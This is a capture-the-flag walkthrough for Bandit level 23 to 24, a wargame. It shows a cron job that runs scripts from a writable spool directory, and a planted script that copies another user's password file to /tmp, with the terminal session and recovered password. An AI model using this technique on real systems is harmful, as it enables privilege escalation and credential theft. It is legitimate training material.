## Bandit Level 23 -> Level 24

## Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

## Commands you may need to solve this level

cron, crontab, crontab(5) (use "man 5 crontab" to access this)

## Solution

We find the file /usr/bin/cronjob_bandit24.sh would be executed.
And it will execute all scripts in /var/spool/bandit24 and then delete them.
Otherway, I know the password is stored in /etc/bandit_pass/bandit24.
So I would like to touch a file named tash.sh whose content is followed:
```
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/ans
```
It means copy the content of '/etc/bandit_pass/bandit24' to '/tmp/ans'
Then dont forget change the access permissions and copy it to /var/spool/bandit24/
After a while, we can see the password if /tmp/ans.
That is all.

```
bandit23@melinda:~$ cd /etc/cron.d
bandit23@melinda:/etc/cron.d$ ls
behemoth4_cleanup  cronjob_bandit24       melinda-stats          natas26_cleanup  semtex0-64   vortex0
cron-apt           cronjob_bandit24_root  natas-session-toucher  natas27_cleanup  semtex0-ppc  vortex20
cronjob_bandit22   leviathan5_cleanup     natas-stats            php5             semtex5
cronjob_bandit23   manpage3_resetpw_job   natas25_cleanup        semtex0-32       sysstat
bandit23@melinda:/etc/cron.d$ cat cronjob_bandit24
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@melinda:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        timeout -s 9 60 "./$i"
        rm -f "./$i"
    fi
done


bandit23@melinda:/etc/cron.d$ cd /tmp
bandit23@melinda:/tmp$ vim task.sh
bandit23@melinda:/tmp$ cat tash.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/ans
bandit23@melinda:/tmp$ ls -l tash.sh
-rw-rw-r-- 1 bandit23 bandit23 53 May 12 22:00 tash.sh
bandit23@melinda:/tmp$ chmod 777 tash.sh
bandit23@melinda:/tmp$ cp tash.sh /var/spool/bandit24/
(afer a while ...)
bandit23@melinda:/tmp$ cat ans
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

